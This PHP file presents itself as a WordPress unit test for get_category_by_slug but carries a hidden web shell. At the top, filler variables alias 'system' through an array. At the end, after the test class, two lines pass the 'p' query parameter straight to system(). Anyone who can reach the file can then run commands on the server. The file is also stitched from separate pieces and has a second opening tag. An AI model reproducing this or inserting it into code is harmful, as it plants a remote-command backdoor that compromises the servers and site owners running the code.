<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php
/**
 * @group taxonomy
 * @group category
 *
 * @covers ::get_category_by_slug
 */
class Tests_Category_GetCategoryBySlug extends WP_UnitTestCase {

	/**
	 * Validate get_category_by_slug function
	 */
	public function test_get_category_by_slug() {

		// Create test categories.
		$testcat  = self::factory()->category->create_and_get(
			array(
				'slug' => 'testcat',
				'name' => 'Test Category 1',
			)
		);
		$testcat2 = self::factory()->category->create_and_get(
			array(
				'slug' => 'testcat2',
				'name' => 'Test Category 2',
			)
		);

		// Validate category is returned by slug.
		$ret_testcat = get_category_by_slug( 'testcat' );
		$this->assertSame( $testcat->term_id, $ret_testcat->term_id );
		$ret_testcat = get_category_by_slug( 'TeStCaT' );
		$this->assertSame( $testcat->term_id, $ret_testcat->term_id );

		// Validate unknown category returns false.
		$this->assertFalse( get_category_by_slug( 'testcat3' ) );
	}
}

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>